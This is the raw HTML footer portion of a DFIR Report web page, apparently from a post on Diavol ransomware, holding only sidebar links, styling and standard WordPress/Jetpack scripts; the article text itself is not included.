<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside>
</div>
</div>
</div>
<footer id="colophon" class="site-footer" role="contentinfo">
<div class="copyright-area">
<div class="wrap">
<div class="site-info">
<a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved </div>
<div class="footer-right-info">
</div>
</div>
</div>
</footer>
<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
</div>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="a9cd24205746bd4ad0a209ac-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2021\/12\/13\/diavol-ransomware\/":4874};
	</script>
<style id="jetpack-block-subscriptions-inline-css" type="text/css">
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.6.2" id="freenews-navigation-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.6.2" id="freenews-skip-link-focus-fix-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.6.2" id="ResizeSensor-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.6.2" id="theia-sticky-sidebar-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.6.2" id="slick-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.6.2" id="freenews-slick-settings-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.6.2" id="jquery-sticky-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.6.2" id="freenews-sticky-settings-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.6.2" id="marquee-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.6.2" id="freenews-marquee-settings-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://stats.wp.com/e-202443.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"4874\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:13.9.1\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "4874" ]);
/* ]]> */
</script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=13.9.1" id="google-translate-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=13.9.1" id="jetpack-block-subscriptions-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="a9cd24205746bd4ad0a209ac-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>
<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="a9cd24205746bd4ad0a209ac-|49" defer></script></body>
</html>
